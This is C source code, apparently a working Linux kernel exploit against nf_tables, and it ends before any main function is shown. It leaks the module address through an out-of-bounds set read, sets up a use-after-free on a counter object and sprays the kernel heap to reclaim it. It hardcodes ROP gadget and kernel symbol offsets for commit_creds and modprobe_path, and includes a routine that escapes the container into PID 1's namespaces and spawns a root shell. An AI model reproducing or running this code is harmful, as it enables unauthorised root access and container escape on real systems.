#define _GNU_SOURCE

#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables_compat.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/set.h>
#include <libnftnl/object.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <fcntl.h>

#define PORT_SERVER 8888

#define FAMILY NFPROTO_INET

#define TABLE_NAME_LEAK "t_leak"
#define TABLE_NAME_VICTIM "t_victim"
#define TABLE_NAME_TRIGGER "t_trigger"

#define CHAIN_NAME_TRIGGER "c_trigger"
#define CHAIN_NAME_OBJ "c_obj"

#define SET_NAME_LEAK "s_leak"
#define SET_NAME_VICTIM "s_victim"

#define OBJ_NAME_VICTIM "o_victim"

#define SET_ID_LEAK 0x1111
#define SET_ID_VICTIM 0x2222

#define OBJ_SPRAY_FMT "o_spray%d"
#define OBJ_SPRAY_PER_BATCH 32
#define OBJ_SPRAY_BATCHES 32

#define CHAIN_SPRAY_FMT "c_spray%d"
#define CHAIN_SPRAY_PER_BATCH 8
#define CHAIN_SPRAY_BATCHES_FIRST 256
#define CHAIN_SPRAY_BATCHES_SUBSEQUENT 768

#define NFT_OBJECT_NAME 0x20
#define NFT_OBJECT_OPS 0x80

#define NF_TABLES_SUBSYS_OFFSET 0x28420
#define NF_TABLES_KFREE_CALL 0x1384
#define NF_TABLES_SECMARK_OBJ_OPS 0x29aa0

#define PUSH_RDI_POP_RSP_POP_RBP_RET 0x6d9311
#define POP_RDI_RET 0x66ebd
#define POP_RSI_RET 0xfe63e
#define POP_RBP_RET 0x802
#define CMP_ECX_ECX_RET 0x5fb27
#define MOV_RDI_RAX_JNE_RET 0x626d94
#define MOV_QWORD_PTR_RSI_RDI_RET 0x2582be

#define KFREE_OFFSET 0x337450
#define DMI_CLASS_KFREE_OFFSET 0x2198180
#define PREPARE_KERNEL_CRED 0xe8780
#define COMMIT_CREDS 0xe84c0
#define KPTI_TRAMPOLINE 0xe0100b
#define FIND_TASK_BY_VPID 0xde7d0
#define INIT_NSPROXY 0x1e8a120
#define SWITCH_TASK_NAMESPACES 0xe6ca0
#define MODPROBE_PATH 0x1e8b460

#define EXECVE_SYSCALL 59

void *nf_tables;
void *vmlinux;
void *heap;
uint32_t mnl_seq = 1, start_seq, end_seq;
uint32_t objid_spr = 1, objid_fr = 1, ignore_fr_id;
uint32_t chainid_spr = 1, chainid_fr = 1;
char obj_data[256];
char cname[256];
unsigned long user_cs, user_ss, user_rflags, user_sp;

void get_shell(){
    puts("[+] Returned to userland");
    if (getuid() == 0){
        puts("[+] uid: 0, got root!!!");
        puts("[*] Escaping container");
        setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
        setns(open("/proc/1/ns/pid", O_RDONLY), 0);
        setns(open("/proc/1/ns/net", O_RDONLY), 0);
        setns(open("/proc/1/ns/user", O_RDONLY), 0);
        puts("[*] Spawning root shell");
        syscall(EXECVE_SYSCALL, "/bin/bash", 0, 0);
    } else {
        printf("[!] uid: %d, didn't get root\n", getuid());
        exit(0);
    }
}

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[+] Saved state");
}

static int setup_sandbox(void)
{
  struct rlimit fdlim;
  cpu_set_t set;
  int pid;
  
  if (unshare(CLONE_NEWUSER) < 0)
  {
    perror("[-] unshare(CLONE_NEWUSER)");
    return -1;
  }

  if (unshare(CLONE_NEWNET) < 0)
  {
    perror("[-] unshare(CLONE_NEWNET)");
    return -1;
  }

  pid = fork();
  if (pid == 0) {
    setsid();
    while (1) sleep(1000);
  }

  fdlim.rlim_cur = fdlim.rlim_max = (1 << 20);
  if (setrlimit(RLIMIT_NOFILE, &fdlim) < 0) {
    perror("[-] setrlimit");
    return -1;
  }

  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(getpid(), sizeof(set), &set) < 0)
  {
    perror("[-] sched_setaffinity");
    return -1;
  }

  return 0;
}

static struct nftnl_table *init_table(uint16_t family, const char *name)
{
  struct nftnl_table *t;

  t = nftnl_table_alloc();
  if (t == NULL)
  {
    perror("[-] init_table");
    return NULL;
  }

  nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
  nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);

  return t;
}

static struct nftnl_chain *init_chain(const char *table, const char *name, bool basechain, const char *udata, uint32_t udlen)
{
  struct nftnl_chain *t;

  t = nftnl_chain_alloc();
  if (t == NULL)
  {
    perror("[-] init_chain");
    return NULL;
  }

  nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table);
  nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, name);

  if (basechain)
  {
    nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, NF_INET_LOCAL_OUT);
    nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, 0);
  }

  if (udata) {
    nftnl_chain_set_data(t, NFTNL_CHAIN_USERDATA, udata, udlen);
  }
  return t;
}

static struct nftnl_rule *init_rule(uint16_t family, const char *table, const char *chain)
{
  struct nftnl_rule *r;

  r = nftnl_rule_alloc();
  if (r == NULL)
  {
    perror("[-] init_rule");
    return NULL;
  }

  nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
  nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
  nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);

  return r;
}

static struct nftnl_expr *init_objref_map_expr(uint32_t setid)
{
  struct nftnl_expr *e;

  e = nftnl_expr_alloc("objref");
  if (e == NULL)
  {
    perror("[-] init_objref_map_expr");
    return NULL;
  }

  nftnl_expr_set_u32(e, NFTNL_EXPR_OBJREF_SET_ID, setid);
  nftnl_expr_set_u32(e, NFTNL_EXPR_OBJREF_SET_SREG, NFT_REG32_00); //set register

  return e;
}

static struct nftnl_expr *init_objref_imm_expr(const char *objname, uint32_t objtype)
{
  struct nftnl_expr *e;

  e = nftnl_expr_alloc("objref");
  if (e == NULL)
  {
    perror("[-] init_objref_imm_expr");
    return NULL;
  }

  nftnl_expr_set_str(e, NFTNL_EXPR_OBJREF_IMM_NAME, objname);
  nftnl_expr_set_u32(e, NFTNL_EXPR_OBJREF_IMM_TYPE, objtype);

  return e;
}

static struct nftnl_expr *init_compat_tg_expr(const char *name, const char rev, const char *info, uint32_t infolen)
{
  struct nftnl_expr *e;

  e = nftnl_expr_alloc("target");
  if (e == NULL)
  {
    perror("[-] init_compat_tg_expr");
    return NULL;
  }

  nftnl_expr_set_str(e, NFTNL_EXPR_TG_NAME, name);
  nftnl_expr_set_u32(e, NFTNL_EXPR_TG_REV, rev);
  nftnl_expr_set_data(e, NFTNL_EXPR_TG_INFO, info, infolen);

  return e;
}

static struct nftnl_set *init_leak_set(uint8_t family, const char *table, const char *name, uint32_t setid, uint8_t *field_len, uint8_t field_count)
{
  struct nftnl_set *s = NULL;

  s = nftnl_set_alloc();
  if (s == NULL)
  {
    perror("[-] init_leak_set");
    return NULL;
  }

  nftnl_set_set_u32(s, NFTNL_SET_FAMILY, family);
  nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
  nftnl_set_set_str(s, NFTNL_SET_NAME, name);
  nftnl_set_set_u32(s, NFTNL_SET_KEY_LEN, sizeof(uint16_t));
  nftnl_set_set_u32(s, NFTNL_SET_ID, setid);
  nftnl_set_set_u32(s, NFTNL_SET_KEY_TYPE, 13);
  nftnl_set_set_data(s, NFTNL_SET_DESC_CONCAT, field_len, field_count);

  return s;
}

static struct nftnl_set *init_obj_set(uint8_t family, const char *table, const char *name, uint32_t setid, uint32_t objtype)
{
  struct nftnl_set *s = NULL;

  s = nftnl_set_alloc();
  if (s == NULL)
  {
    perror("[-] init_obj_set");
    return NULL;
  }

  nftnl_set_set_u32(s, NFTNL_SET_FAMILY, family);
  nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
  nftnl_set_set_str(s, NFTNL_SET_NAME, name);
  nftnl_set_set_u32(s, NFTNL_SET_KEY_LEN, sizeof(uint16_t));
  nftnl_set_set_u32(s, NFTNL_SET_ID, setid);
  nftnl_set_set_u32(s, NFTNL_SET_KEY_TYPE, 13);
  nftnl_set_set_u32(s, NFTNL_SET_FLAGS, NFT_SET_OBJECT | NFT_SET_TIMEOUT);
  nftnl_set_set_u32(s, NFTNL_SET_OBJ_TYPE, objtype);
  nftnl_set_set_u64(s, NFTNL_SET_TIMEOUT, 1500);
  nftnl_set_set_u32(s, NFTNL_SET_GC_INTERVAL, 2000);

  return s;
}

static struct nftnl_set_elem *init_set_elem(const char *object)
{
  struct nftnl_set_elem *se = NULL;

  se = nftnl_set_elem_alloc();
  if (se == NULL)
  {
    perror("[-] init_set_elem");
    return NULL;
  }

  nftnl_set_elem_set_str(se, NFTNL_SET_ELEM_OBJREF, object);
  //NFT_SET_ELEM_CATCHALL = 0x2
  nftnl_set_elem_set_u32(se, NFTNL_SET_ELEM_FLAGS, 0x2);

  return se;
}

static struct nftnl_obj *init_obj(const char *table, const char *name, uint32_t type)
{
  struct nftnl_obj *o = NULL;

  o = nftnl_obj_alloc();
  if (o == NULL)
  {
    perror("[-] init_obj");
    return NULL;
  }

  nftnl_obj_set_str(o, NFTNL_OBJ_TABLE, table);
  nftnl_obj_set_str(o, NFTNL_OBJ_NAME, name);
  nftnl_obj_set_u32(o, NFTNL_OBJ_TYPE, type);

  return o;
}

static void start_nftnl_batch(struct mnl_nlmsg_batch *batch)
{
  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), mnl_seq++);
  mnl_nlmsg_batch_next(batch);
  start_seq = mnl_seq;
}

static void batch_new_table(struct mnl_nlmsg_batch *batch, struct nftnl_table *t)
{
  struct nlmsghdr *nlh;

  nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWTABLE, FAMILY,
                                    NLM_F_CREATE | NLM_F_ACK, mnl_seq++);
  nftnl_table_nlmsg_build_payload(nlh, t);
  mnl_nlmsg_batch_next(batch);
}

static void batch_new_chain(struct mnl_nlmsg_batch *batch, struct nftnl_chain *c)
{
  struct nlmsghdr *nlh;

  nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWCHAIN, FAMILY,
                                    NLM_F_CREATE | NLM_F_ACK, mnl_seq++);
  nftnl_chain_nlmsg_build_payload(nlh, c);
  mnl_nlmsg_batch_next(batch);
}

static void batch_new_rule(struct mnl_nlmsg_batch *batch, struct nftnl_rule *r)
{
  struct nlmsghdr *nlh;

  nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                   NFT_MSG_NEWRULE, FAMILY,
                                   NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK, mnl_seq++);
  nftnl_rule_nlmsg_build_payload(nlh, r);
  mnl_nlmsg_batch_next(batch);
}

static void batch_new_set(struct mnl_nlmsg_batch *batch, struct nftnl_set *s)
{
  struct nlmsghdr *nlh;

  nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                  NFT_MSG_NEWSET, FAMILY,
                                  NLM_F_CREATE | NLM_F_ACK, mnl_seq++);
  nftnl_set_nlmsg_build_payload(nlh, s);
  mnl_nlmsg_batch_next(batch);
}

static void batch_new_set_elem(struct mnl_nlmsg_batch *batch, struct nftnl_set *s)
{
  struct nlmsghdr *nlh;

  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                              NFT_MSG_NEWSETELEM, FAMILY,
                              NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                              mnl_seq++);
  nftnl_set_elems_nlmsg_build_payload(nlh, s);
  mnl_nlmsg_batch_next(batch);
}

static void batch_new_obj(struct mnl_nlmsg_batch *batch, struct nftnl_obj *o)
{
  struct nlmsghdr *nlh;

  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                              NFT_MSG_NEWOBJ, FAMILY, NLM_F_ACK, mnl_seq++);
  nftnl_obj_nlmsg_build_payload(nlh, o);
  mnl_nlmsg_batch_next(batch);
}

static void batch_del_table(struct mnl_nlmsg_batch *batch, struct nftnl_table *t)
{
  struct nlmsghdr *nlh;

  nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_DELTABLE, FAMILY,
                                    NLM_F_ACK, mnl_seq++);
  nftnl_table_nlmsg_build_payload(nlh, t);
  mnl_nlmsg_batch_next(batch);
}

static void batch_del_chain(struct mnl_nlmsg_batch *batch, struct nftnl_chain *c)
{
  struct nlmsghdr *nlh;

  nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_DELCHAIN, FAMILY,
                                    NLM_F_ACK, mnl_seq++);
  nftnl_chain_nlmsg_build_payload(nlh, c);
  mnl_nlmsg_batch_next(batch);
}

static void batch_del_obj(struct mnl_nlmsg_batch *batch, struct nftnl_obj *o)
{
  struct nlmsghdr *nlh;

  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                              NFT_MSG_DELOBJ, FAMILY, NLM_F_ACK,
                              mnl_seq++);
  nftnl_obj_nlmsg_build_payload(nlh, o);
  mnl_nlmsg_batch_next(batch);
}

static void end_nftnl_batch(struct mnl_nlmsg_batch *batch)
{
  end_seq = mnl_seq;
  nftnl_batch_end(mnl_nlmsg_batch_current(batch), mnl_seq++);
  mnl_nlmsg_batch_next(batch);
}

static int run_cb(struct mnl_socket *nl, uint32_t seq, mnl_cb_t cb_data, void *data)
{
  char buf[MNL_SOCKET_BUFFER_SIZE];
  int ret;

  ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
  while (ret > 0)
  {
    ret = mnl_cb_run(buf, ret, seq, mnl_socket_get_portid(nl), cb_data, data);
    if (ret <= 0)
      break;
    ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
  }

  return ret;
}

static int request_compat(struct mnl_socket *nl, const char *name, uint32_t rev, uint32_t type)
{
  char buf[MNL_SOCKET_BUFFER_SIZE];
  struct nlmsghdr *nlh;
  struct nfgenmsg *nfg;
  uint32_t seq = mnl_seq++;
  int ret;

  nlh = mnl_nlmsg_put_header(buf);
  nlh->nlmsg_type = (NFNL_SUBSYS_NFT_COMPAT << 8) | NFNL_MSG_COMPAT_GET;
  nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
  nlh->nlmsg_seq = seq;

  nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
  nfg->nfgen_family = AF_INET;
  nfg->version = NFNETLINK_V0;
  nfg->res_id = 0;

  mnl_attr_put_strz(nlh, NFTA_COMPAT_NAME, name);
  mnl_attr_put_u32(nlh, NFTA_COMPAT_REV, htonl(rev));
  mnl_attr_put_u32(nlh, NFTA_COMPAT_TYPE, htonl(type));

  if (((ret = mnl_socket_sendto(nl, nlh, nlh->nlmsg_len))) < 0)
  {
    perror("[-] mnl_socket_sendto");
    return ret;
  }

  if ((ret = run_cb(nl, seq, NULL, NULL)) < 0)
  {
    perror("[-] run_cb");
    return ret;
  }

  return 0;
}

static int force_trans_gc(struct mnl_socket *nl)
{
  struct nftnl_expr *ec;
  struct nftnl_rule *rc;
  struct mnl_nlmsg_batch *batch;
  char buf[MNL_SOCKET_BUFFER_SIZE];
  int ret;
  
  rc = init_rule(FAMILY, TABLE_NAME_TRIGGER, CHAIN_NAME_TRIGGER);
  ec = init_compat_tg_expr("AUDIT", 0, strdup(""), 1);
  nftnl_rule_add_expr(rc, ec);

  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  start_nftnl_batch(batch);

  batch_new_rule(batch, rc);
  nftnl_rule_free(rc);

  end_nftnl_batch(batch);

  if ((ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch))) < 0)
  {
    perror("[-] mnl_socket_sendto 1");
    return ret;
  }

  mnl_nlmsg_batch_stop(batch);

  for (int i = start_seq; i < end_seq; ++i)
  {
    if ((ret = run_cb(nl, i, NULL, NULL)) < 0)
    {
      perror("[-] run_cb 1");
      return ret;
    }
  }

  return 0;
}

static int spray_objects(struct mnl_socket *nl)
{
  struct nftnl_obj *o[OBJ_SPRAY_PER_BATCH];
  struct mnl_nlmsg_batch *batch;
  char buf[MNL_SOCKET_BUFFER_SIZE];
  char objname[128];
  int ret;

  for (int b = 0; b < OBJ_SPRAY_BATCHES; ++b)
  {
    for (int i = 0; i < OBJ_SPRAY_PER_BATCH; ++i)
    {
      sprintf(objname, OBJ_SPRAY_FMT, objid_spr++);
      o[i] = init_obj(TABLE_NAME_TRIGGER, objname, NFT_OBJECT_COUNTER);
    }

    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    start_nftnl_batch(batch);

    for (int i = 0; i < OBJ_SPRAY_PER_BATCH; ++i)
    {
      batch_new_obj(batch, o[i]);
      nftnl_obj_free(o[i]);
    }

    end_nftnl_batch(batch);

    if ((ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch))) < 0)
    {
      perror("[-] mnl_socket_sendto");
      return ret;
    }

    mnl_nlmsg_batch_stop(batch);

    for (int i = start_seq; i < end_seq; ++i)
    {
      if ((ret = run_cb(nl, i, NULL, NULL)) < 0)
      {
        perror("[-] run_cb");
        return ret;
      }
    }
  }

  return 0;
}
static int cleanup_obj(struct mnl_socket *nl, char* objname){
  struct nftnl_obj *obj;
  struct mnl_nlmsg_batch *batch;
  char buf[MNL_SOCKET_BUFFER_SIZE];
  int ret;

  obj = init_obj(TABLE_NAME_TRIGGER, objname, NFT_OBJECT_COUNTER);

  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  start_nftnl_batch(batch);

  batch_del_obj(batch, obj);
  nftnl_obj_free(obj);

  end_nftnl_batch(batch);
  if ((ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch))) < 0)
  {
    perror("[-] mnl_socket_sendto 4");
    return ret;
  }
  for (int i = start_seq; i < end_seq; ++i)
  {
    if ((ret = run_cb(nl, i, NULL, NULL)) < 0)
    {
      perror("[-] run_cb");
      return ret;
    }
  }

  return force_trans_gc(nl);
}

static int cleanup_chain(struct mnl_socket *nl, char* chainname){
  struct nftnl_chain *chain;
  struct mnl_nlmsg_batch *batch;
  char buf[MNL_SOCKET_BUFFER_SIZE];
  int ret;

  chain = init_chain(TABLE_NAME_TRIGGER, chainname, false, NULL, 0);

  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  start_nftnl_batch(batch);

  batch_del_chain(batch, chain);
  nftnl_chain_free(chain);

  end_nftnl_batch(batch);
  if ((ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch))) < 0)
  {
    perror("[-] mnl_socket_sendto");
    return ret;
  }
  for (int i = start_seq; i < end_seq; ++i)
  {
    if ((ret = run_cb(nl, i, NULL, NULL)) < 0)
    {
      perror("[-] run_cb");
      return ret;
    }
  }
  return force_trans_gc(nl);
}

static int cleanup_first_spray_chain(struct mnl_socket *nl)
{
  struct nftnl_chain *c[CHAIN_SPRAY_PER_BATCH];
  struct mnl_nlmsg_batch *batch;
  char buf[MNL_SOCKET_BUFFER_SIZE];
  int ret;
  char objname[128];

  for (int b = 0; b < CHAIN_SPRAY_BATCHES_FIRST; ++b)
  {
    for (int i = 0; i < CHAIN_SPRAY_PER_BATCH; ++i)
    {
      sprintf(objname, CHAIN_SPRAY_FMT, chainid_fr++);
      c[i] = init_chain(TABLE_NAME_TRIGGER, objname, false, NULL, 0);
    }

    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    start_nftnl_batch(batch);

    for (int i = 0; i < CHAIN_SPRAY_PER_BATCH; ++i)
    {
      batch_del_chain(batch, c[i]);
      nftnl_chain_free(c[i]);
    }

    end_nftnl_batch(batch);

    if ((ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch))) < 0)
    {
      perror("[-] mnl_socket_sendto");
      return ret;
    }

    mnl_nlmsg_batch_stop(batch);

    for (int i = start_seq; i < end_seq; ++i)
    {
      if ((ret = run_cb(nl, i, NULL, NULL)) < 0)
      {
        perror("[-] run_cb");
        return ret;
      }
    }
  }

  return force_trans_gc(nl);
}

static int spray_chain(struct mnl_socket *nl, const char *data, size_t sz, bool first_time)
{
  int chain_spray_batches;
  if (first_time){
    chain_spray_batches = CHAIN_SPRAY_BATCHES_FIRST;
  }else{
    chain_spray_batches = CHAIN_SPRAY_BATCHES_SUBSEQUENT;
  }
  
  struct nftnl_chain *c[CHAIN_SPRAY_PER_BATCH];
  struct mnl_nlmsg_batch *batch;
  char buf[MNL_SOCKET_BUFFER_SIZE];
  int ret;
  char objname[128];

  for (int b = 0; b < chain_spray_batches; ++b)
  {
    for (int i = 0; i < CHAIN_SPRAY_PER_BATCH; ++i)
    {
      sprintf(objname, CHAIN_SPRAY_FMT, chainid_spr++);
      c[i] = init_chain(TABLE_NAME_TRIGGER, objname, false, data, sz);
    }

    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    start_nftnl_batch(batch);
    for (int i = 0; i < CHAIN_SPRAY_PER_BATCH; ++i)
    {
      batch_new_chain(batch, c[i]);
      nftnl_chain_free(c[i]);
    }
    end_nftnl_batch(batch);

    if ((ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch))) < 0)
    {
      perror("[-] mnl_socket_sendto");
      return ret;
    }
    mnl_nlmsg_batch_stop(batch);

    for (int i = start_seq; i < end_seq; ++i)
    {
      if ((ret = run_cb(nl, i, NULL, NULL)) < 0)
      {
        perror("[-] run_cb");
        return ret;
      }
    }
    
  }

  return 0;
}

static int trigger_set_oob(struct mnl_socket *nl)
{
  struct nftnl_table *t;
  struct nftnl_set *s;
  struct mnl_nlmsg_batch *batch;
  char buf[MNL_SOCKET_BUFFER_SIZE];
  uint8_t field_len[256];
  uint8_t field_count = 16;
  int ret = -1;

  memset(field_len, 1, sizeof(field_len));
  field_len[field_count++] = 0x30;

  t = init_table(FAMILY, TABLE_NAME_LEAK);
  if (t == NULL)
    return -1;

  s = init_leak_set(FAMILY, TABLE_NAME_LEAK, SET_NAME_LEAK, SET_ID_LEAK, field_len, field_count);
  if (s == NULL)
    goto err_tbl;

  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  start_nftnl_batch(batch);
  batch_new_table(batch, t);
  batch_new_set(batch, s);
  end_nftnl_batch(batch);

  if ((ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch))) < 0)
  {
    perror("[-] mnl_socket_sendto");
    goto err_batch;
  }

  mnl_nlmsg_batch_stop(batch);
  nftnl_set_free(s);
  nftnl_table_free(t);

  for (int i = start_seq; i < end_seq; ++i)
  {
    if ((ret = run_cb(nl, i, NULL, NULL)) < 0)
    {
      perror("[-] run_cb");
      return ret;
    }
  }

  return 0;

err_batch:
  mnl_nlmsg_batch_stop(batch);
  nftnl_set_free(s);

err_tbl:
  nftnl_table_free(t);
  return ret;
}

static int get_set_cb(const struct nlmsghdr *nlh, void *data)
{
  const uint8_t *field_len;
  struct nftnl_set *s;
  uint32_t field_count;

  s = nftnl_set_alloc();
  if (s == NULL)
  {
    perror("[-] nftnl_set_alloc");
    goto err;
  }

  if (nftnl_set_nlmsg_parse(nlh, s) < 0)
  {
    perror("[-] nftnl_set_nlmsg_parse");
    goto err_free;
  }

  field_len = nftnl_set_get_data(s, NFTNL_SET_DESC_CONCAT, &field_count);
  nf_tables = (void *)((*(uint64_t *)(field_len + 0x1c)) - NF_TABLES_SUBSYS_OFFSET);
err_free:
  nftnl_set_free(s);
err:
  return MNL_CB_OK;
}

static int leak_nf_tables(struct mnl_socket *nl)
{
  char buf[MNL_SOCKET_BUFFER_SIZE];
  struct nlmsghdr *nlh;
  uint32_t seq;
  struct nftnl_set *s = NULL;
  int ret;

  s = nftnl_set_alloc();
  if (s == NULL)
  {
    perror("[-] nftnl_set_alloc");
    return -1;
  }

  seq = mnl_seq++;
  nlh = nftnl_set_nlmsg_build_hdr(buf, NFT_MSG_GETSET, FAMILY,
                                  NLM_F_DUMP | NLM_F_ACK, seq);
  nftnl_set_nlmsg_build_payload(nlh, s);
  nftnl_set_free(s);

  if (((ret = mnl_socket_sendto(nl, nlh, nlh->nlmsg_len))) < 0)
  {
    perror("[-] mnl_socket_sendto");
    return ret;
  }

  if ((ret = run_cb(nl, seq, get_set_cb, NULL)) < 0)
  {
    perror("[-] run_cb");
    return ret;
  }

  return 0;
}

static int setup_uaf(struct mnl_socket *nl)
{
  struct nftnl_table *tv, *tt;
  struct nftnl_chain *c;
  struct nftnl_rule *r;
  struct nftnl_expr *e;
  struct nftnl_set *s;
  struct nftnl_set_elem *se;
  struct nftnl_obj *o;
  struct mnl_nlmsg_batch *batch;
  char buf[MNL_SOCKET_BUFFER_SIZE];
  int ret;

  tv = init_table(FAMILY, TABLE_NAME_VICTIM);
  o = init_obj(TABLE_NAME_VICTIM, OBJ_NAME_VICTIM, NFT_OBJECT_COUNTER);
  s = init_obj_set(FAMILY, TABLE_NAME_VICTIM, SET_NAME_VICTIM, SET_ID_VICTIM, NFT_OBJECT_COUNTER);
  se = init_set_elem(OBJ_NAME_VICTIM);
  nftnl_set_elem_add(s, se);

  tt = init_table(FAMILY, TABLE_NAME_TRIGGER);
  c = init_chain(TABLE_NAME_TRIGGER, CHAIN_NAME_TRIGGER, false, NULL, 0);
  r = init_rule(FAMILY, TABLE_NAME_TRIGGER, CHAIN_NAME_TRIGGER);
  e = init_objref_map_expr(SET_ID_VICTIM);
  nftnl_rule_add_expr(r, e);

  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  start_nftnl_batch(batch);

  batch_new_table(batch, tv);
  batch_new_obj(batch, o);
  batch_new_set(batch, s);
  batch_new_set_elem(batch, s);

  batch_new_table(batch, tt);
  batch_new_chain(batch, c);
  batch_new_rule(batch, r);

  batch_del_table(batch, tv);

  end_nftnl_batch(batch);

  if ((ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch))) < 0)
  {
    perror("[-] mnl_socket_sendto");
    return ret;
  }
  mnl_nlmsg_batch_stop(batch);

  for (int i = start_seq; i < end_seq; ++i)
  {
    if ((ret = run_cb(nl, i, NULL, NULL)) < 0)
    {
      perror("[-] run_cb");
      return ret;
    }
  }

  return force_trans_gc(nl);
}

static int setup_arb_read(struct mnl_socket *nl)
{
  struct nftnl_expr *eo = NULL;
  struct nftnl_obj *o[OBJ_SPRAY_PER_BATCH];
  struct nftnl_chain *co;
  struct nftnl_rule *ro;
  struct mnl_nlmsg_batch *batch;
  char buf[MNL_SOCKET_BUFFER_SIZE];
  int ret;
  char objname[128];

  if (spray_objects(nl) < 0)
    return -1;

  printf("[*] Sleeping to wait for set gc...\n");
  sleep(5);
  
  for (int b = 0; b < OBJ_SPRAY_BATCHES; ++b)
  {
    for (int i = 0; i < OBJ_SPRAY_PER_BATCH; ++i)
    {
      sprintf(objname, OBJ_SPRAY_FMT, objid_fr + b * OBJ_SPRAY_PER_BATCH + i);
      o[i] = init_obj(TABLE_NAME_TRIGGER, objname, NFT_OBJECT_COUNTER);
    }

    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    start_nftnl_batch(batch);

    for (int i = 0; i < OBJ_SPRAY_PER_BATCH; ++i)
    {
      batch_del_obj(batch, o[i]);
      nftnl_obj_free(o[i]);
    }

    end_nftnl_batch(batch);

    if ((ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch))) < 0)
    {
      perror("[-] mnl_socket_sendto 2");
      return ret;
    }

    mnl_nlmsg_batch_stop(batch);

    for (int i = start_seq; i < end_seq; ++i)
    {
      if ((ret = run_cb(nl, i, NULL, NULL)) < 0)
      {
        if (eo != NULL)
        {
          perror("[-] run_cb 2");
          return ret;
        }

        sprintf(objname, OBJ_SPRAY_FMT, objid_fr + b * OBJ_SPRAY_PER_BATCH + i - start_seq);
        printf("[+] Reclaimed object: %s\n", objname);
        co = init_chain(TABLE_NAME_TRIGGER, CHAIN_NAME_OBJ, true, NULL, 0);
        ro = init_rule(FAMILY, TABLE_NAME_TRIGGER, CHAIN_NAME_OBJ);
        eo = init_objref_imm_expr(objname, NFT_OBJECT_COUNTER);
        nftnl_rule_add_expr(ro, eo);
      }
    }
  
    if (eo != NULL)
      break;
  }

  if (eo == NULL)
  {
    printf("[-] Cannot reclaim object\n");
    return -1;
  }
  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  start_nftnl_batch(batch);

  batch_new_chain(batch, co);
  batch_new_rule(batch, ro);

  end_nftnl_batch(batch);

  if ((ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch))) < 0)
  {
    perror("[-] mnl_socket_sendto 3");
    return ret;
  }

  mnl_nlmsg_batch_stop(batch);

  for (int i = start_seq; i < end_seq; ++i)
  {
    if ((ret = run_cb(nl, i, NULL, NULL)) < 0)
    {
      perror("[-] run_cb 3");
      return ret;
    }
  }
  
  objid_fr = objid_spr;
  
  return cleanup_obj(nl, objname) < 0;
}

